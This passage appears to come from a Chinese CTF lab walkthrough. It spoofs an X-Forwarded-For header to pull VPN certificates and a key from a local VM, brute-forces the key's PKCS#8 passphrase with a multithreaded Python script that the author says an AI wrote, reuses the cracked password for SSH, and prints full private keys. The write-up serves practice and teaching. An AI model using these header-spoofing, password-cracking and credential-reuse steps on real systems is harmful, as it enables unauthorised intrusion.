+                    70:09
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 Basic Constraints:
+                CA:FALSE
+            X509v3 Subject Key Identifier:
+                0C:00:84:70:42:07:FE:16:5D:8C:E4:63:95:F7:34:AD:7F:2E:EA:DD
+            X509v3 Authority Key Identifier:
+                keyid:65:93:9B:66:F2:58:FD:7C:2E:57:CE:24:71:67:63:21:72:0C:8B:71
+                DirName:/CN=My-Home CA
+                serial:16:C2:3E:CC:EA:27:02:F6:50:03:E9:BC:51:9E:4D:52:E8:CC:A4:AB
+            X509v3 Extended Key Usage:
+                TLS Web Client Authentication
+            X509v3 Key Usage:
+                Digital Signature
+    Signature Algorithm: sha256WithRSAEncryption
+    Signature Value:
+        7d:c5:8c:04:97:a2:98:d0:dc:74:6f:ca:f7:07:86:01:a6:91:
+        0b:70:58:87:62:6b:f7:cd:9e:4a:32:41:2b:bd:03:ed:88:42:
+        c1:ec:7b:92:b1:91:cb:ab:a0:84:4f:be:33:4c:9d:c0:d9:1c:
+        54:03:a1:fc:a2:96:c4:62:a1:76:78:ca:eb:7f:0c:5d:f5:ac:
+        fe:1f:bc:96:aa:13:38:50:04:f2:ca:f8:f5:4d:28:c6:20:8a:
+        45:b3:bb:1c:b4:69:2a:05:14:ed:ba:94:e8:d3:39:42:81:7a:
+        1d:15:35:d6:19:2b:e1:83:3c:3a:7b:73:76:39:c1:46:69:94:
+        44:5a:eb:91:2b:7c:d3:02:9f:23:47:8a:94:86:d4:86:fd:65:
+        2c:7e:98:c6:a2:6f:8e:a7:3a:26:f7:44:f3:18:fc:f5:70:3c:
+        7b:a5:d9:5f:53:2d:c5:c8:28:a8:ef:03:44:1a:7e:97:cc:57:
+        1d:7c:24:a4:b6:cb:cf:e5:94:1a:e6:72:51:24:d0:52:ba:79:
+        01:04:81:34:49:f3:81:02:46:88:e5:14:86:fb:8f:74:09:36:
+        7a:ab:f9:80:e3:ca:c3:b9:16:0f:25:f1:dd:ec:93:f0:4e:af:
+        f6:77:1c:94:9a:31:3d:6a:3c:d6:b2:35:41:79:56:b7:7c:c8:
+        90:a0:e8:d6
+-----BEGIN CERTIFICATE-----
+MIIDVDCCAjygAwIBAgIRAKT1ysfmS85mxC3zsaoXd3IwDQYJKoZIhvcNAQELBQAw
+FTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE3MTdaFw0yNzA3MTkx
+NjE3MTdaMBIxEDAOBgNVBAMMB2NsaWVudDEwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+DwAwggEKAoIBAQCkGK9Zvm82MWR/a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI
+7TIKLFb6AH2BtJSlCTH62RaYqbxkPL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pif
+uuVcz3JifYBRIKC6EU/ZzlxnLEBgGMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhW
+YGRkBuQAhh72edqETsURHSrTIL9c2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+s
+OryeCp+d00uvQgXbt7O3TMs6b4ljU3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x
+34316LsiygpcOeDWV1eoxQw5Gk9C1TgY8HAJAgMBAAGjgaEwgZ4wCQYDVR0TBAIw
+ADAdBgNVHQ4EFgQUDACEcEIH/hZdjORjlfc0rX8u6t0wUAYDVR0jBEkwR4AUZZOb
+ZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhvbWUgQ0GCFBbC
+PszqJwL2UAPpvFGeTVLozKSrMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE
+AwIHgDANBgkqhkiG9w0BAQsFAAOCAQEAfcWMBJeimNDcdG/K9weGAaaRC3BYh2Jr
+982eSjJBK70D7YhCwex7krGRy6ughE++M0ydwNkcVAOh/KKWxGKhdnjK638MXfWs
+/h+8lqoTOFAE8sr49U0oxiCKRbO7HLRpKgUU7bqU6NM5QoF6HRU11hkr4YM8Ontz
+djnBRmmURFrrkSt80wKfI0eKlIbUhv1lLH6YxqJvjqc6JvdE8xj89XA8e6XZX1Mt
+xcgoqO8DRBp+l8xXHXwkpLbLz+WUGuZyUSTQUrp5AQSBNEnzgQJGiOUUhvuPdAk2
+eqv5gOPKw7kWDyXx3eyT8E6v9ncclJoxPWo81rI1QXlWt3zIkKDo1g==
+-----END CERTIFICATE-----</pre></div>
+<p>拿着下面内容让<code class="notranslate">ai</code>组合一个</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt </span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
+组合以下，形成一个ovpn文件</pre></div>
+<p>以下是<code class="notranslate">ai</code>整合后的完整 <code class="notranslate">client.ovpn</code> 文件内容，已嵌入证书和密钥</p>
+<pre class="notranslate"><code class="notranslate"># OpenVPN 客户端配置文件
+client
+dev tun
+proto udp
+remote 192.168.31.65 1194  # 替换为实际服务器公网 IP（若为内网则需公网映射）
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+
+# 内嵌 CA 根证书
+&lt;ca&gt;
+-----BEGIN CERTIFICATE-----
+MIIDSDCCAjCgAwIBAgIUFsI+zOonAvZQA+m8UZ5NUujMpKswDQYJKoZIhvcNAQEL
+BQAwFTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE2NDJaFw0zNTA0
+MTMxNjE2NDJaMBUxEzARBgNVBAMMCk15LUhvbWUgQ0EwggEiMA0GCSqGSIb3DQEB
+AQUAA4IBDwAwggEKAoIBAQDdeTDZboEmIg6d+KahlCJ/Gr4cKp4NvGJJU25AOxqb
+QBHJp4zWuMN6VLkxMfXfOzpwsQK+noyjtpZSR8JrsmFz8OaBI0KK7FNyPLNWYyEY
+PJ+kzNMf+RRmbA2xNkIHms7j4ziSylmHYebHAmxCscS6cH/R4XyFNp1GdXe/3iJL
+dALNo6jymspAVR+x2/E7K/bCg9d7JLny9ZCLxXbVIIIjd8quMFKyJ3ZBfsFdY6ym
+T6W0NY2fQYQKSR/6LparsgIlVM06Qpykdog3V12z8+8XALZNw0My5Y9TbMgtDovV
++y1RFRMK1mTNuUU2vriM/q7n/zFb5hJsZwiJ3m4exMuvAgMBAAGjgY8wgYwwDAYD
+VR0TBAUwAwEB/zAdBgNVHQ4EFgQUZZObZvJY/XwuV84kcWdjIXIMi3EwUAYDVR0j
+BEkwR4AUZZObZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhv
+bWUgQ0GCFBbCPszqJwL2UAPpvFGeTVLozKSrMAsGA1UdDwQEAwIBBjANBgkqhkiG
+9w0BAQsFAAOCAQEAlFOyWCn96KRBq0b6QYWRhqWbhDeMJD+EhwKK2JeMUzLc2XOy
+91/kSbvquVuohif8xkg4J6uVuLwNGOjuFo8mooLYzHKZGXkmpEo66PyswbnguAD9
+QuPLYHJ63vwUvIATv5WpH9ZWUxaMYaqU9SgHrcqi86jNOOds4j/07VWmslnRO3GX
+S/THLanVD9zlrXJNnu1x6g+nUddXsI6OON5nGlO4ki8a5nt+2GnJ+3vGvc4w44Gu
+AXWl/rl/AIv1UAph/Pm25U/BK4FjWSIO3Gx1YvZkwqUnpnN8wr2KF3oB01Y0w6dD
+e2okw+XCzCMr1SP+UihU5h4zSMQi6/Tf4e0HDw==
+-----END CERTIFICATE-----
+&lt;/ca&gt;
+
+# 内嵌客户端证书
+&lt;cert&gt;
+-----BEGIN CERTIFICATE-----
+MIIDVDCCAjygAwIBAgIRAKT1ysfmS85mxC3zsaoXd3IwDQYJKoZIhvcNAQELBQAw
+FTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE3MTdaFw0yNzA3MTkx
+NjE3MTdaMBIxEDAOBgNVBAMMB2NsaWVudDEwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+DwAwggEKAoIBAQCkGK9Zvm82MWR/a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI
+7TIKLFb6AH2BtJSlCTH62RaYqbxkPL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pif
+uuVcz3JifYBRIKC6EU/ZzlxnLEBgGMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhW
+YGRkBuQAhh72edqETsURHSrTIL9c2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+s
+OryeCp+d00uvQgXbt7O3TMs6b4ljU3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x
+34316LsiygpcOeDWV1eoxQw5Gk9C1TgY8HAJAgMBAAGjgaEwgZ4wCQYDVR0TBAIw
+ADAdBgNVHQ4EFgQUDACEcEIH/hZdjORjlfc0rX8u6t0wUAYDVR0jBEkwR4AUZZOb
+ZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhvbWUgQ0GCFBbC
+PszqJwL2UAPpvFGeTVLozKSrMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE
+AwIHgDANBgkqhkiG9w0BAQsFAAOCAQEAfcWMBJeimNDcdG/K9weGAaaRC3BYh2Jr
+982eSjJBK70D7YhCwex7krGRy6ughE++M0ydwNkcVAOh/KKWxGKhdnjK638MXfWs
+/h+8lqoTOFAE8sr49U0oxiCKRbO7HLRpKgUU7bqU6NM5QoF6HRU11hkr4YM8Ontz
+djnBRmmURFrrkSt80wKfI0eKlIbUhv1lLH6YxqJvjqc6JvdE8xj89XA8e6XZX1Mt
+xcgoqO8DRBp+l8xXHXwkpLbLz+WUGuZyUSTQUrp5AQSBNEnzgQJGiOUUhvuPdAk2
+eqv5gOPKw7kWDyXx3eyT8E6v9ncclJoxPWo81rI1QXlWt3zIkKDo1g==
+-----END CERTIFICATE-----
+&lt;/cert&gt;
+
+# 内嵌客户端私钥（需输入密码）
+&lt;key&gt;
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A
+xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI
+o2XhzDmt4VwIs9a2+TlCU8B9wfv4CKyoX6kqbmbEjwnUtIjV6ouTAdp423q8aEMP
+9vIPo/QUvnAAcxflWs0JAg9cDN9Mix1TygNaqtiOnfodE/powg2+HJH58byf3C2/
+L9i/Eyhy4PUFBocAQEMcL+OOlhV6N/K+YI26UpM3cb1W/bZa/D1kitPTc3aNaEcm
+cik0vozX4LaCAkWUkrfQTDmWy30nvSGlByAOrdKTdc73ZKYjhfJ0aBAvnr3l9YJ1
+6P5GZ4plb0rsATaxKJX2qlza9CeAVtEBYxJXtLsv82ydLhdV9QIfL971GRwT7ufJ
+O04GlQnnD1+RXsgX/HX8TlqtWB+cNHPXU5goKoV98vMU9LhOLkgBt+F8VBXngXSa
+x/6vVA2JTq14GAuVptRRvk3NWspXbWPcEfeIRjagP1+d2eIZB6Jf3KNqFzlEZJBg
+9sVFw8K4Kl1y46A767/6zAgR1yWxZUIu4DqqxrD/J+jefqEzHEpWs/hKkqDFOiY+
+rtTiaG1DwVMw+EUCOOkWlzgC+J+z4ne26NxlRrDEIg85X5UfDnbDzQcvTOq8QZHF
+QH0OMFtKVT3EnKyChVSKDSjSBoMV6DjWB1BGI9SIaca5yKjtYJm9ZKgc319XnuDH
+LCHIQfERyaTypf87MAahh0P43ZUn4FJoH7DVa4R4lluyJnwr3fXcPdN+lmVAlH/b
+fLsGy3NNjBjNqUgkr923SOoTQXtz8HN1TSM/P11w6udvjOcHtBTV+eRczkBStvPV
+W0OqZMPGDaEg+HGsdQt3moGxRwgP7HEHp7IRR1mvHHjtg4UgflDtfa5BfxEOlWyF
+p/aV4JTVWsBhV6jEEhtY2+5vvhRammSvW6+HWqpicEE0Kekm5lf9hh3jNvXPbeuP
+gV000gW7ZfHRmIbfGn1/RQtizqxBDrzjPsXIvrnsR5kdqWuDYdI3681QErb7txoX
++7urFS1MErtwmMIxsjkKgZyxzn71CHrSRwxlPSJMOe4LWprVk92By533yuccJXNx
+Lk63VtvH/H+EPeFisTnX2rN7Y4Yz/k+wbJH7cyS5PMu0I49scZPqWnZwEd+6SyKq
+3AkTXtytghizriWnxlq4dzaAUjDGCnR9vqy8cNgpJRwQTczorCqRf+3vf8oji0b+
+IeyTNyJeS+S8YEoFSxCHVdSy1YS7EnXWAF7fV49Rpwz8kzdi+dGVXyF9oxp+XAM5
+827TdKT0NueVxakHRqm6Px23xQHvfPn2lYbzX1C1piLRFAXOk+5l7VflLoCl5QnN
+UjzWysu0morMJ8d4nrhaCzcUQc55lJJoX5VU3tRrAjQ1yDhmKKQ0Ga3iGiA3CGop
+BNj4qIST98Z/fcVT79ZP0kykcD91KNOQsJz7Zc6gJvat2EbCZksj584981bySrgA
+vWJ/0ikaF2+PrVHrKMi6cn75Eiz2fO2xovr8q8sh0n3iegHvAmXRhU2zb2DEjTWk
+X+UgNh/LzoYJEkFE+atB7QnPy5TB+HQF/UW22ZAygXkzVdk8Wl36hlsDNtz+wvOd
+uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD
+Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue
+-----END ENCRYPTED PRIVATE KEY-----
+&lt;/key&gt;
+
+# 加密算法配置
+cipher AES-256-GCM
+verb 3
+</code></pre>
+<h3>4.获得shinosawa</h3>
+<h5>爆破私钥<code class="notranslate">PKCS#8</code>密码</h5>
+<p>注意<code class="notranslate">client.key</code>是<code class="notranslate">PKCS#8</code>加密文件,需解密</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+...
+└─<span class="pl-c"><span class="pl-c">#</span>   openssl pkcs8 -in client.key -out de.txt -passin pass:123</span>
+<span class="pl-c"><span class="pl-c">#</span>可以通过这种方式去才密码</span>
+└─<span class="pl-c"><span class="pl-c">#</span> for i in $(cat /CTF/suForce_dir/top12000.txt);do echo $i;openssl pkcs8 -in client.key -out de.txt -passin pass:$i;[ $?  -eq 0] &amp;&amp; break ;done</span></pre></div>
+<p>看来字典小了，换个超大的字典，用<code class="notranslate">ai</code>写个多线程爆破python脚本</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
+<span class="pl-k">import</span> <span class="pl-s1">subprocess</span>
+<span class="pl-k">import</span> <span class="pl-s1">sys</span>
+<span class="pl-k">import</span> <span class="pl-s1">threading</span>
+<span class="pl-k">from</span> <span class="pl-s1">concurrent</span>.<span class="pl-s1">futures</span> <span class="pl-k">import</span> <span class="pl-v">ThreadPoolExecutor</span>
+<span class="pl-k">from</span> <span class="pl-s1">pathlib</span> <span class="pl-k">import</span> <span class="pl-v">Path</span>
+
+<span class="pl-c"># 配置项</span>
+<span class="pl-c1">KEY_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"client.key"</span>        <span class="pl-c"># 目标私钥文件</span>
+<span class="pl-c1">DICT_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt"</span>  <span class="pl-c"># 密码字典</span>
+<span class="pl-c1">THREADS</span> <span class="pl-c1">=</span> <span class="pl-c1">8</span>                    <span class="pl-c"># 并发线程数（根据CPU核心调整）</span>
+<span class="pl-c1">OUT_FILE</span> <span class="pl-c1">=</span> <span class="pl-s">"de.txt"</span>            <span class="pl-c"># 解密输出文件</span>
+
+<span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">False</span>                  <span class="pl-c"># 全局终止标志</span>
+<span class="pl-s1">found_lock</span> <span class="pl-c1">=</span> <span class="pl-s1">threading</span>.<span class="pl-c1">Lock</span>()  <span class="pl-c"># 线程锁</span>
+
+<span class="pl-k">def</span> <span class="pl-en">try_password</span>(<span class="pl-s1">password</span>):
+    <span class="pl-k">global</span> <span class="pl-s1">found</span>
+    
+    <span class="pl-c"># 检查终止标志</span>
+    <span class="pl-k">if</span> <span class="pl-s1">found</span>:
+        <span class="pl-k">return</span>
+    
+    <span class="pl-c"># 执行 OpenSSL 命令</span>
+    <span class="pl-k">try</span>:
+        <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">run</span>(
+            [<span class="pl-s">"openssl"</span>, <span class="pl-s">"pkcs8"</span>, <span class="pl-s">"-in"</span>, <span class="pl-c1">KEY_FILE</span>, <span class="pl-s">"-out"</span>, <span class="pl-c1">OUT_FILE</span>, <span class="pl-s">"-passin"</span>, <span class="pl-s">f"pass:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>],
+            <span class="pl-s1">stdout</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">DEVNULL</span>,
+            <span class="pl-s1">stderr</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">DEVNULL</span>,
+            <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">5</span>  <span class="pl-c"># 防止卡死</span>
+        )
+        
+        <span class="pl-c"># 检查返回码</span>
+        <span class="pl-k">if</span> <span class="pl-s1">result</span>.<span class="pl-c1">returncode</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
+            <span class="pl-k">with</span> <span class="pl-s1">found_lock</span>:
+                <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">found</span>:
+                    <span class="pl-s1">found</span> <span class="pl-c1">=</span> <span class="pl-c1">True</span>
+                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span>[+] 密码找到: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">password</span><span class="pl-kos">}</span></span>"</span>)
+                    <span class="pl-en">Path</span>(<span class="pl-c1">OUT_FILE</span>).<span class="pl-c1">unlink</span>(<span class="pl-s1">missing_ok</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)  <span class="pl-c"># 清理临时文件</span>
+                    <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">0</span>)
+    <span class="pl-k">except</span>:
+        <span class="pl-k">pass</span>
+
+<span class="pl-k">def</span> <span class="pl-en">main</span>():
+    <span class="pl-c"># 检查文件是否存在</span>
+    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-en">Path</span>(<span class="pl-c1">KEY_FILE</span>).<span class="pl-c1">exists</span>():
+        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 错误：私钥文件 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">KEY_FILE</span><span class="pl-kos">}</span></span> 不存在"</span>)
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    
+    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-en">Path</span>(<span class="pl-c1">DICT_FILE</span>).<span class="pl-c1">exists</span>():
+        <span class="pl-en">print</span>(<span class="pl-s">f"[-] 错误：字典文件 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">DICT_FILE</span><span class="pl-kos">}</span></span> 不存在"</span>)
+        <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    
+    <span class="pl-en">print</span>(<span class="pl-s">f"[*] 开始爆破 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">KEY_FILE</span><span class="pl-kos">}</span></span>，使用字典: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">DICT_FILE</span><span class="pl-kos">}</span></span>"</span>)
+    <span class="pl-en">print</span>(<span class="pl-s">f"[* 线程数: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">THREADS</span><span class="pl-kos">}</span></span>"</span>)
+
+    <span class="pl-c"># 使用生成器逐行读取字典</span>
+    <span class="pl-k">def</span> <span class="pl-en">password_generator</span>():
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-c1">DICT_FILE</span>, <span class="pl-s">'r'</span>, <span class="pl-s1">errors</span><span class="pl-c1">=</span><span class="pl-s">'ignore'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span>:
+                <span class="pl-s1">pwd</span> <span class="pl-c1">=</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()
+                <span class="pl-k">if</span> <span class="pl-s1">pwd</span>:
+                    <span class="pl-k">yield</span> <span class="pl-s1">pwd</span>
+    
+    <span class="pl-c"># 启动线程池</span>
+    <span class="pl-k">with</span> <span class="pl-en">ThreadPoolExecutor</span>(<span class="pl-s1">max_workers</span><span class="pl-c1">=</span><span class="pl-c1">THREADS</span>) <span class="pl-k">as</span> <span class="pl-s1">executor</span>:
+        <span class="pl-k">try</span>:
+            <span class="pl-k">for</span> <span class="pl-s1">count</span>, <span class="pl-s1">pwd</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-en">password_generator</span>(), <span class="pl-c1">1</span>):
+                <span class="pl-k">if</span> <span class="pl-s1">found</span>:
+                    <span class="pl-k">break</span>
+                <span class="pl-s1">executor</span>.<span class="pl-c1">submit</span>(<span class="pl-s1">try_password</span>, <span class="pl-s1">pwd</span>)
+                <span class="pl-c"># 显示进度</span>
+                <span class="pl-k">if</span> <span class="pl-s1">count</span> <span class="pl-c1">%</span> <span class="pl-c1">1000</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
+                    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\r</span>[*] 已尝试 <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">count</span><span class="pl-kos">}</span></span> 个密码"</span>, <span class="pl-s1">end</span><span class="pl-c1">=</span><span class="pl-s">''</span>, <span class="pl-s1">flush</span><span class="pl-c1">=</span><span class="pl-c1">True</span>)
+        <span class="pl-k">except</span> <span class="pl-v">KeyboardInterrupt</span>:
+            <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>[!] 用户中断操作"</span>)
+            <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">1</span>)
+    
+    <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>[-] 字典穷举完毕，未找到正确密码"</span>)
+
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-en">main</span>()</pre></div>
+<pre class="notranslate"><code class="notranslate">└─# python3 dxc.py
+[*] 开始爆破 client.key，使用字典: /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+[* 线程数: 8
+[*] 已尝试 999000 个密码
+[+] 密码找到: hiro
+
+[-] 字典穷举完毕，未找到正确密码
+</code></pre>
+<p>爆破得密码：<code class="notranslate">hiro</code></p>
+<p>可以用<code class="notranslate">openssl</code>把加密私钥变成没密码的，然后 把<code class="notranslate">client.ovpn</code> 文件复制一份为<code class="notranslate">2021.ovpn</code>，再把里面的<code class="notranslate">&lt;key&gt;</code>内容换成解密后的，登陆就不用输密码了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> openssl rsa -in client.key -out client_un.key</span>
+Enter pass phrase <span class="pl-k">for</span> client.key:<span class="pl-c"><span class="pl-c">#</span>hiro</span>
+writing RSA key
+└─<span class="pl-c"><span class="pl-c">#</span> cat client_un.key</span>
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCkGK9Zvm82MWR/
+a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI7TIKLFb6AH2BtJSlCTH62RaYqbxk
+PL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pifuuVcz3JifYBRIKC6EU/ZzlxnLEBg
+GMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhWYGRkBuQAhh72edqETsURHSrTIL9c
+2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+sOryeCp+d00uvQgXbt7O3TMs6b4lj
+U3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x34316LsiygpcOeDWV1eoxQw5Gk9C
+1TgY8HAJAgMBAAECggEABnAR/A46sHh4Wf/hUz97XWiGDsTy3lxaT7aewLUWFXlZ
+Bmimad2FZa0G5gS8J8ko/j8Juw7GgkuBcLjJ57SMCfN1Y8l5ErW50MEV5kICXUWl
+2X0OOREE49LfKNJF5RjnuVkJxhCgoysTJPn/xxUlBzDyD77rBLIh3xkbe5subI+V
+s/hEW7wDjcd5G2ekzh3EZM03OeQbgin386gxFa4piuLFCG3As74eE/By+Qr+MfBK
+sUWwAkTm292Mk3THeLNaeWISI8v4sQhsgC6McbwX5awXXs3Do01w1enw/5pWdv3o
+Wvbp72/fhc2m6JLu7pqx8SzoOhqfHxhzaI88r0gngQKBgQDYKmURthJSwvgCHA/d
+VkRlgR3qcb1eMizoag/e+7HrbQssI8HQWeDyOXE2OfxMv1X+jO6vmnLy4WwB/dxT
+t3ejmP7Gr4MZgI2CCmxNaZJsJC16iR0DcLoFAKsaLHDtu4D88As+zH8h3lVqME5r
+6m1Vbm82DDeLjh2q3psK6qM7gQKBgQDCVe2p9ls1O4vs5PJ+1XUqrbnuNthZF1cf
+InYANA+sFsFbsZiICLWSe1at0x3r2z4blWlOk7/ic+HkR6AnM8KM5tRneVuyy8f2
+ryLEHa/zK0nTcU8paTw0/f1OJLaopPJh/kS3xzetpuwr34sjbOUlQBHo1QjxkW2g
+MjrfwMGYiQKBgQDL1u6HzRFqScBk/OFY7siAj0kOk0LnWJlQcPOWafJU9vbaIL3b
+I2YkBFbls7hfBu6oo21Q2mwa7MdU+XaS2ydOdi+KXGdb3QWT4xBNz4frwhHAwxtA
+60P/A6pVfCLhizcPTazNAzm/TlFtWTAaQ23macUlSk/2oYUIY/IAUVKsAQKBgFZf
+aqpH3HHkbWR0vXKx3MmDPUgrCC1QumAUKO4eNXj/BCGE5Y5QkKLyPqwzUPErGIeZ
++Jv7/yTe7F9RllTWJHoLfgwfXCozeESjwof3yeQCMWXQzqZRJ3lGCfdZSfXamgAD
+yvcDjDOaJQ265VRxaccMmukpBjiXsmmo6ZHZUjJBAoGBAIjTXkoBeg+TlMwdls8q
+1eCE/DZfwItYfWxeqdVJ2HK6v59d+vLFAopFzRnohtEyUUY/4IUh39EL29tLk0bx
+5AxrD6ejM3nmGSNjisUbBPcu742wOl7qUYjIQDV4NE1JBbBNVaekRkrhATHEP8xZ
+wKeMlrWu46yJMi06bbPWijoJ
+-----END PRIVATE KEY-----</pre></div>
+<p>不要忘了前面的提示信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
+<span class="pl-c"><span class="pl-c">#</span> Last modified by shinosawa</span>
+<span class="pl-c"><span class="pl-c">#</span> Regenerate a STRONG password for the KEY</span>
+<span class="pl-c"><span class="pl-c">#</span> Do NOT use a SAME password as other services et. SSH</span></pre></div>
+<h5>获得<code class="notranslate">ssh</code>密码</h5>
+<p>用户名<code class="notranslate">shinosawa</code>，<code class="notranslate">ssh</code>密码：<code class="notranslate">hiro</code>，现在还不能直接<code class="notranslate">ssh</code>登陆（可尝试虚拟机本地登录），因为<code class="notranslate">ssh</code>服务要通过<code class="notranslate">openvpn</code>进</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> openvpn 2021.vpn</span>
+2025-05-14 21:37:02 Note: Kernel support <span class="pl-k">for</span> ovpn-dco missing, disabling data channel offload.
+2025-05-14 21:37:02 OpenVPN 2.6.13 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
+2025-05-14 21:37:02 library versions: OpenSSL 3.4.0 22 Oct 2024, LZO 2.10
+2025-05-14 21:37:02 DCO version: N/A
+2025-05-14 21:37:02 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm <span class="pl-k">for</span> more info.
+2025-05-14 21:37:02 TCP/UDP: Preserving recently used remote address: [AF_INET]192.168.31.65:1194
+2025-05-14 21:37:02 Socket Buffers: R=[212992-<span class="pl-k">&gt;</span>212992] S=[212992-<span class="pl-k">&gt;</span>212992]
+2025-05-14 21:37:02 UDPv4 link local: (not bound)
+2025-05-14 21:37:02 UDPv4 link remote: [AF_INET]192.168.31.65:1194
+2025-05-14 21:37:02 TLS: Initial packet from [AF_INET]192.168.31.65:1194, sid=8ad9a8fe 421c5c41
+2025-05-14 21:37:02 VERIFY OK: depth=1, CN=My-Home CA
+2025-05-14 21:37:02 VERIFY OK: depth=0, CN=server
+2025-05-14 21:37:02 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bits RSA, signature: RSA-SHA256, peer temporary key: 253 bits X25519
+2025-05-14 21:37:02 [server] Peer Connection Initiated with [AF_INET]192.168.31.65:1194
